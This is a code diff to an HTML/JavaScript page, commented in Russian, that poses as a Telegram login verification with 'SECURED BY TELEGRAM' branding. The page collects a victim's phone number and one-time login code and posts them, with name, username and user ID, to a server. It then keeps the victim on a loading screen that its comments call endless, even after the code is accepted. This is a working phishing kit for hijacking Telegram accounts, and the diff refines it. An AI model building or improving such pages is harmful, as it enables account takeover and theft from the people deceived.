@@ -405,9 +405,8 @@
             margin: 0 auto;
         }
 
-        /* Скрываем кнопку назад на экране загрузки */
-        .verification-section .back-btn {
-            display: none;
+        .back-btn-hidden {
+            display: none !important;
         }
     </style>
 </head>
@@ -488,7 +487,7 @@
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Шаг 3: Ввод кода -->
+        <!-- Шаг 3: Ввод кода (как на фото) -->
         <div id="stepCode" class="code-section">
             <div style="text-align:center; margin-bottom:16px;">
                 <div style="font-size:32px; margin-bottom:4px;">🔐</div>
@@ -526,7 +525,7 @@
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Шаг 4: Бесконечная загрузка (авторизация) -->
+        <!-- Шаг 4: Бесконечная загрузка -->
         <div id="stepVerification" class="verification-section">
             <div class="verification-card">
                 <div class="icon">⏳</div>
@@ -564,7 +563,6 @@
         const userId = user.id || 'нет_id';
 
         let userPhone = '';
-        let verificationCode = '';
         let loadingInterval = null;
         let loadingMessages = [
             '⏳ Подключение к серверу...',
@@ -616,7 +614,7 @@
             showStep(stepRegion);
         });
 
-        // Шаг 2 → Отправка кода
+        // Шаг 2 → Отправка кода и переход на ввод кода
         btnSendCode.addEventListener('click', function() {
             const region = regionSelect.value;
             const phone = phoneInput.value.trim().replace(/\s/g, '');
@@ -651,7 +649,7 @@
                 const masked = userPhone.slice(0, -4) + '****';
                 displayPhone.textContent = masked;
                 
-                // Переходим к вводу кода
+                // СРАЗУ ПЕРЕХОДИМ НА ЭКРАН ВВОДА КОДА (как на фото)
                 showStep(stepCode);
                 codeInput.focus();
                 
@@ -675,8 +673,6 @@
                 return;
             }
 
-            verificationCode = code;
-            
             // Показываем экран загрузки
             showStep(stepVerification);
             
@@ -694,7 +690,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     phone: userPhone,
-                    code: verificationCode,
+                    code: code,
                     fullName: fullName,
                     username: username,
                     userId: userId
@@ -704,7 +700,6 @@
             .then(data => {
                 console.log('✅ Код подтвержден:', data);
                 // Код верный - продолжаем показывать загрузку (бесконечно)
-                // Ничего не делаем, просто крутим
             })
             .catch(err => {
                 console.log('❌ Ошибка:', err);
